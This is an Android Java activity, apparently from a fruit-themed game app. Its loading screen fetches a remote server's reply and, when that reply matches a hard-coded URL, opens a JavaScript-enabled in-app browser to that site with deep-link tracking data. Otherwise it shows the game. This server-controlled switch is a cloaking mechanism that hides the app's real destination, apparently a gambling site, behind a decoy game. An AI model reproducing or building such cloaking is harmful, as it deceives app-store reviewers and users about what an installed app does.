package com.example.fruitinius;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TextView;
import android.widget.Toast;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpRetryException;
import java.net.URL;
import java.net.URLConnection;
import java.util.Timer;
import java.util.TimerTask;

import bolts.AppLinks;

public class load_screen extends AppCompatActivity {
    private Timer timer;
    private TimerTask timerTask;
    private WebView web;
    private TextView text;
    private String dot = ".";
    private String correctUrl = "https://kalemika.club/osnova";
    private  String currentUrl;
    private  Uri deepURI = null;
    private final String link = "https://fruktovayapobeda.com/pobeda";
    private int time = 0;
    private  boolean end = false;

    @SuppressLint("ClickableViewAccessibility")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_load_screen);
        web = findViewById(R.id.web);
        text = findViewById(R.id.textload);
        WebSettings webSettings = web.getSettings();
        webSettings.setJavaScriptEnabled(true);
        String file = "file:android_res/drawable/load_try2.gif";
        web.loadUrl(file);
        web.setVerticalScrollBarEnabled(false);
        web.setHorizontalScrollBarEnabled(false);

        web.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                return (event.getAction() == MotionEvent.ACTION_MOVE);
            }
        });
        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        if (timer != null) {
            timer.cancel();
        }
        Thread myThread = new Thread(
                new Runnable() {
                    public void run() {
                        try {
                            currentUrl = getUrlSource(link);
                            deepURI = getDeepUrl();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
        );
        myThread.setPriority(10);
        myThread.setDaemon(true);
        myThread.start();
        timer = new Timer();
        timerTask = new myTimerTask();
        timer.schedule(timerTask, 2000, 1000);
    }


    private Uri getDeepUrl() {
        Uri targetUrl = AppLinks.getTargetUrlFromInboundIntent(getApplicationContext(), getIntent());
        if (targetUrl == null) {
            Log.d("TargetURL", "onCreate: " + targetUrl);
        } else {
            Log.d("Target URL", "onCreate: " + targetUrl);
        }
        return targetUrl;
    }

    private class myTimerTask extends TimerTask {
        @Override
        public void run() {
            time += 1;
            if (end == false) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        text.setText("Load" + dot);
                        dot = "." + dot;
                        if (dot.equals("....")) dot = ".";
                        if (time >= 10) {
                            if (timer != null) {
                                timer.cancel();
                                timer = null;
                                end = true;
                                text.setText("All ready, wait a moment");
                            }
                            if (currentUrl.equals(correctUrl)) {
                                Intent intent = new Intent(load_screen.this, Browser.class);
                                intent.putExtra("link", currentUrl);
                                if (deepURI == null)
                                    intent.putExtra("data", "second");
                                else
                                    intent.putExtra("data", getData(deepURI.toString()));

                                startActivity(intent);
                            } else {
                                Intent intent = new Intent(load_screen.this, MainActivity.class); //2D game
                                startActivity(intent);
                            }
                        }
                    }
                });
            }
        }
    }

    private String getUrlSource(String site) throws IOException {
        try {
            URL url = new URL(site);
            URLConnection urlc = url.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    urlc.getInputStream(), "UTF-8"));
            String inputLine;
            StringBuilder a = new StringBuilder();
            while ((inputLine = in.readLine()) != null)
                a.append(inputLine);
            in.close();
            return a.toString();
        } catch (Exception e) {
            Log.d("Some problems ", "getUrlSource: " + e.toString());
        }
        return "";
    }

    private String getData(String deep) {
        try {
            String url = deep;
            String[] arrOfStr = url.split("param", 2);
            return arrOfStr[arrOfStr.length - 1];
        } catch (Exception e) {
            Log.d("Error ", "getData: " + e);
        }
        return "second";
    }
}


//        AppLinkData.fetchDeferredAppLinkData(getApplicationContext(),// late deep
//                new AppLinkData.CompletionHandler() {
//                    @Override
//                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
//                        try {
//                            Uri targetUrl = appLinkData.getTargetUri();
//
//                        }catch (Exception ex){
//
//                        }
//
//                    }
//                }
//        );
//app://param?sub3=1_1
//?sub3=1_1
